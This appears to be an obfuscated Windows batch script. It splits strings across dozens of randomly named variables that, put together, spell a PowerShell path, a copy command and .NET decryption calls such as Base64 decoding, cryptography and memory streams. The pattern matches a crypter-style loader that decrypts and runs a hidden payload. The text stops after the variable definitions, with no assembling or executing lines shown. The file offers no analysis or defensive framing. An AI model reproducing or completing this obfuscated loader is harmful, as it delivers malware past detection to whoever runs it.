@echo off
set "IKXtvlnIST=py"
set "hnyhSMNLal=.e"
set "qpeHwVNHCr=Po"
set "XzbUTEjwLZ=ow"
set "RPiLRdUyOi= /"
set "RpKIzdflMF=32"
set "yVhdbkiGJs=y "
set "aTtQhnAsKg=Sy"
set "awHOLUDxuU=\v"
set "nvMGmBVasN=rS"
set "ZKaCKsgXoY=ws"
set "mBxKuEvjyB=we"
set "KWhAAzcvCD=ll"
set "mWCcghqAmW=in"
set "obQumFNVEh=xe"
set "DXIbttppTl=Wi"
set "TMLJQgLetR=co"
set "fsMkJqimcy= C"
set "qJCiQBaBZA=nd"
set "eezbofrAhK=do"
set "jTDTEljwSI=em"
set "PMZIMELxCK=po"
set "NFYQBarKqz=we"
set "HeAgqiJKRq=s\"
set "xGOCfmNFbM=he"
set "XdBAHvDihM=:\"
set "asloFPZSFt=he"
set "eRMFEFVTrl=\W"
set "bzfXiCwWJS=0\"
set "rKYPXtMjaJ=ll"
set "ZcYoIBqJGi=rs"
set "vcjHOeVNhO=st"
set "ZMoOrvtKlM=1."
set "ecvvoiwKVc= %~dp0"
set "VENVhLAhSK=cd"
set "YyeEZXvLRx=O.Pa"
set "OyQnjXSJVM=);$i"
set "vKeKgybRTY=:('g"
set "aORcArGESI=ddin"
set "sBWLkBOVsh=v4Ir"
set "nHYqMrAnzb=pRXS"
set "EnrrElsVZA=($ho"
set "CyUCXiggWv=oint"
set "FNULwpIYVD=736u"
set "GPFHdwkKiP=vj0m"
set "dCwamdDbAW='dqR"
set "IpjEOhVGJn=ion."
set "ottPstUpnk=b = "
set "BzsQsKjJCa=ress"
set "enGSqJQvNm=oryS"
set "IxMppGwIOd=]::C"
set "CUTOsTWwpy=lBlo"
set "hDwlegsQKd=Mode"
set "IFgdQuVRTe=Secu"
set "ZibkssDQQM=S46e"
set "STocSrynhg=XS);"
set "ngdfUYdxCx=);$i"
set "GiSYRYzIaA='gni"
set "RTlqLfNyQJ='[-1"
set "QWXBCdQflZ=-Obj"
set "RYhapXvHYu=k; }"
set "eSomiBafig=, $A"
set "xzsTNAAWXw=g = "
set "gHxoQMgHly=Bmor"
set "oJSoVlETCl=gnir"
set "UCsFNyflRy=Secu"
set "jYlltpymza=$pzD"
set "SHXCwqLRFP=]::("
set "aFODkhtlGS=7;$i"
set "SJITECTMas=uEmO"
set "gTFhLTmeNI=zd.T"
set "RXbdnKJNEQ=m.IO"
set "meDHjnITTB=j, 0"
set "xdUBsSheKt=vcW."
set "pvMDyyLljp='txe"
set "dJvynCthtJ=-4] "
set "WniDJGkGmc=raph"
set "UYFdwKcBVe=vert"
set "TNBhozFEBB=($ho"
set "mjNoKKWJLL=Obje"
set "ksyVzXtiJf=ose("
set "cwwPoPuPIc= '')"
set "bDgqKyVaux=morF"
set "oRfrIueyzH=e]::"
